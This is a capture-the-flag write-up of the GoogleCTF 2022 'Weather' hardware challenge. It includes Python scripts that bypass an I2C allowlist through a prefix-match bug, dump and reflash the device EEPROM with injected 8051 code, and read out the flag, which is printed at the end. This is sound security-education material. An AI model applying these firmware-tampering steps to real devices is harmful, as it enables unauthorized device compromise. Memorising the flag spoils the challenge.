---
categories:
- Hardware
date: "2022-07-02"
title: "Write-up Weather (GoogleCTF 2022)"
description: "Write-up of the Weather challenge of GoogleCTF 2022."
keywords: ["Google", "CTF", "2022", "writeup", "hardware", "weather"]
---

## Official description

> Our DYI Weather Station is fully secure! No, really! Why are you laughing?!
> OK, to prove it we're going to put a flag in the internal ROM, give you the
> source code, datasheet, and network access to the interface.

We are given a ZIP file containing
[Device Datasheet Snippets.pdf](https://github.com/google/google-ctf/raw/66de2426aaf3e37e4314714d1eb588d5804c62d6/2022/hardware-weather/attachments/Device%20Datasheet%20Snippets.pdf)
and
[firmware.c](https://raw.githubusercontent.com/google/google-ctf/66de2426aaf3e37e4314714d1eb588d5804c62d6/2022/hardware-weather/attachments/firmware.c).
We are also given a server host and port:
`weather.2022.ctfcompetition.com:1337`.

## Exploration

### Datasheet snippets

Let's start by reading the datasheet snippets
[Device Datasheet Snippets.pdf](https://github.com/google/google-ctf/raw/66de2426aaf3e37e4314714d1eb588d5804c62d6/2022/hardware-weather/attachments/Device%20Datasheet%20Snippets.pdf):

  * The system is powered by a `CTF-8051` micro-controller, probably based on
    [Intel 8051](https://en.wikipedia.org/wiki/Intel_8051).

  * The firmware is read from a `CTF-5593D` EEPROM.
      * It contains 64 pages of 64 bytes.
      * It is connected via SPI for data access and I2C for programming.
      * After erase, we can only clear bits via I2C.

  * Multiple I2C sensors are connected to the micro-controller.

  * A `FlagROM` device is present inside the micro-controller.
    It contains the flag.

**From this point the goal is clear: we need to alter the operation of the weather
station to read the content of `FlagROM`.**

### Firmware source code

Let's now read
[firmware.c](https://raw.githubusercontent.com/google/google-ctf/66de2426aaf3e37e4314714d1eb588d5804c62d6/2022/hardware-weather/attachments/firmware.c):

  * This firmware exposes a serial command prompt. This command prompt is
    accessible via Netcat:
    ```
    $ nc weather.2022.ctfcompetition.com 1337
    == proof-of-work: disabled ==
    Weather Station
    ?
    ```
  * Users can issue I2C read commands with the following syntax:
    `r I2C_ADDR LENGTH`.
  * Users can issue I2C write commands with the following syntax:
    `w I2C_ADDR LENGTH BYTE0 BYTE1 BYTE2 ...`.
  * Read and write commands are limited to these whitelisted I2C addresses:
    ```C
    const char *ALLOWED_I2C[] = {
        "101",  // Thermometers (4x).
        "108",  // Atmospheric pressure sensor.
        "110",  // Light sensor A.
        "111",  // Light sensor B.
        "119",  // Humidity sensor.
        NULL
    };
    ```

For example, let's try to write then read to the humidity sensor:
```
? w 119 20 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99
i2c status: transaction completed / ready
? r 119 128
i2c status: transaction completed / ready
37 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
-end
```

The remote command prompt has a 120 seconds time limit:
`exiting (device execution time limited to 120 seconds)`.

## Proposed solution

We exploit a vulnerability in the I2C address parser to read the EEPROM.
Then, we modify a dump of the EEPROM to add instructions to read `FlagROM`.
Finally, we write this modified firmware back to the EEPROM to extract the flag.

### I2C address parser vulnerability

If we try to issue a read command outside of the `ALLOWED_I2C` whitelist,
we get the following error message:
`-err: port invalid or not allowed`. Looking at `firmware.c` we
understand that this error message is due to the `port_to_int8` function
returning `-1`:

```C
int8_t port_to_int8(char *port) {
  if (!is_port_allowed(port)) {
    return -1;
  }

  return (int8_t)str_to_uint8(port);
}
```

`str_to_uint8` cannot return `-1`, i.e. this error message is triggered by
`is_port_allowed` returning `-1`:

```C
bool is_port_allowed(const char *port) {
  for(const char **allowed = ALLOWED_I2C; *allowed; allowed++) {
    const char *pa = *allowed;
    const char *pb = port;
    bool allowed = true;
    while (*pa && *pb) {
      if (*pa++ != *pb++) {
        allowed = false;
        break;
      }
    }
    if (allowed && *pa == '\0') {  // vuln, missing *pb == '\0'
      return true;
    }
  }
  return false;
}
```

This function checks the `port` I2C address against `ALLOWED_I2C` whitelist, but
it has a flaw: it does not check that it reached the end of the `port` string
when reaching the end of an item in `ALLOWED_I2C`.

The following Python script exploits this vulnerability to find all I2C devices:

```Python
import socket

s = socket.socket(socket.AF_INET)
s.connect(("weather.2022.ctfcompetition.com", 1337))

def wait_prompt(s):
    rx = s.recv(1000)
    while not rx.endswith(b"? "):
        rx += s.recv(1000)
    return rx

rx = wait_prompt(s)

# Use "101" thermometers prefix
for i2c_addr in range(101000, 101000+128):
    s.send(f"r {i2c_addr} 1\n".encode())
    rx = wait_prompt(s)

    if b"error - device not found" not in rx:
        print(i2c_addr%128, rx)
```

We get:
```
33 b'i2c status: transaction completed / ready\n? '
101 b'i2c status: transaction completed / ready\n? '
108 b'i2c status: transaction completed / ready\n? '
110 b'i2c status: transaction completed / ready\n? '
111 b'i2c status: transaction completed / ready\n? '
119 b'i2c status: transaction completed / ready\n? '
```

**We discover a new I2C device at address `33` which might be our EEPROM.**
We can read and write to this device using address `101025`.

### Dumping the EEPROM

Let's try to select page and read the maximal amount of data from the EEPROM:

```
? w 101025 1 0
i2c status: transaction completed / ready
? r 101025 128
i2c status: transaction completed / ready
2 0 6 2 4 228 117 129 48 18 8 134 229 130 96 3
2 0 3 121 0 233 68 0 96 27 122 0 144 10 2 120
1 117 160 2 228 147 242 163 8 184 0 2 5 160 217 244
218 242 117 160 255 228 120 255 246 216 253 120 0 232 68 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
-end
```

As mentioned by the datasheet, the EEPROM returns one page of 64 bytes.
Let's dump the whole EEPROM:

```Python
import socket

s = socket.socket(socket.AF_INET)
s.connect(("weather.2022.ctfcompetition.com", 1337))

rx = wait_prompt(s)

dump = b""
for page in range(64):
    s.send(f"w 101025 1 {page}\n".encode())
    rx = wait_prompt(s)

    if not b"transaction completed / ready" in rx:
        print(rx)

    s.send(f"r 101025 64\n".encode())
    rx = wait_prompt(s)

    if not b"transaction completed / ready" in rx:
        print(rx)

    rx = rx.split(b"\n")
    rx = b" ".join(rx[1:-2]).decode()
    rx = bytes(map(int, rx.split()))
    dump += rx
    print(f"Got page {page}")

with open("weather_eeprom.bin", "wb") as f:
    f.write(dump)
```

We use [cpu_rec](https://github.com/airbus-seclab/cpu_rec) and confirm that
the CPU is indeed running Intel 8051 instructions:
```
$ binwalk -% weather_eeprom.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             8051 (size=0x800, entropy=0.787004)
2048          0x800           None (size=0x800, entropy=0.269661)
```

### Patching the EEPROM in Ghidra

We open the dump in Ghidra. After taking some inspiration from some functions,
we are able to craft this assembly code:

```ASM
    MOV CCAP4L,#0       # 0 is the index of the flag
    MOV B,DAT_SFR_ef    # read flag byte
boucle:
    MOV A,TXDAT         # is serial ready?
    JZ  boucle
    MOV TXSTAT,B        # print byte to serial
```

During EEPROM programming, bits can only be cleared: it is impossible to
replace a `0` by a `1`.
We choose to put this piece of assembly code at `0x0a02` offset as it
is filled with `0xFF`. To run this code, we replace the data and code
before with `0x00` which is a NOP instruction.

Let's implement this in Python:
```Python
import socket
import time

for offset in range(256):
    s = socket.socket(socket.AF_INET)
    s.connect(("weather.2022.ctfcompetition.com", 1337))

    def program_page(page, content):
        i2c_addr = 101025  # 33 (eeprom)

        content = [0xFF - c for c in content]
        content = " ".join(map(str, content))

        # 165 90 165 90 is the EEPROM key
        req_len = 127
        s.send(f"w {i2c_addr} {req_len} {page} 165 90 165 90 {content}\n".encode())

        # wait for prompt
        s.settimeout(1)
        time.sleep(1)  # we cannot wait for characters as we are removing them
        try:
            rx = s.recv(1000)
        except socket.timeout:
            rx = None
        if rx and b"status: transaction completed" not in rx:
            print(rx[:1])

    wait_prompt(s)

    # New code
    content = [
        57, 0,
        0x75, 0xee, offset,  # MOV CCAP4L,#offset
        0x85, 0xef, 0xf0,    # MOV B,DAT_SFR_ef
        0xe5, 0xf3,          # MOV A,TXDAT
        0x60, 0xfb,          # JZ  boucle
        0x85, 0xf0, 0xf2,    # MOV TXSTAT,B
    ] + [0] * 49
    program_page(40, content)

    # Erase previous pages until 32-th page
    for page in range(39, 32, -1):
        content = [0] * 64
        program_page(page, content)

    # Do not erase whole 32-th page to align to instruction start
    content = [0xFF, 0xFF] + [0] * 62
    program_page(32, content)

    s.close()
```

We could have put the loop directly in assembly to do it much faster.
After some time we get:
```
b'C'
b'T'
b'F'
b'{
[...]
b'}
b'\n'
```

This is our flag, `CTF{DoesAnyoneEvenReadFlagsAnymore?}`.

{{< figure src="/assets/images/hardware-weather/xkcd.png" title="Based on https://xkcd.com/378/" >}}
